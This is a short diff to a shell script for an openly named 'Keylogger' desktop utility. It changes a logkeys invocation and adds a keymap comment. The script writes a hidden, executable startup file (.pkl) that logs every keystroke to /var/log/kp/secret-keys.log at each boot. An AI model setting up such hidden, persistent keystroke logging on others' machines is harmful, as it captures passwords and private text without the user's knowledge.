@@ -3,6 +3,7 @@
 #i18n josejp2424
 #l10n nilsonmorales
 #v0.3 grey color
+#Geoffrey fix us keymap added 11022016
 
 export TEXTDOMAIN=Keylogger
 export OUTPUT_CHARSET=UTF-8
@@ -35,7 +36,7 @@ r=`tail -n 1 /tmp/keylogger.tmp`
 
 if [ "$r" == "1" ];then
 echo "#!/bin/sh
-logkeys -s -m --us-keymap --no-func-keys -o /var/log/kp/secret-keys.log
+logkeys -s --us-keymap --no-func-keys -o /var/log/kp/secret-keys.log
 " > $HOME/Startup/.pkl && chmod +x /root/Startup/.pkl && /root/Startup/.pkl
 Xdialog --rc-file /root/.color.rc --title "$TITLE $VERSION" --icon "$ICON" --msgbox "$title2 \n\n us" 10 40 
    exit ## Exit Script ##
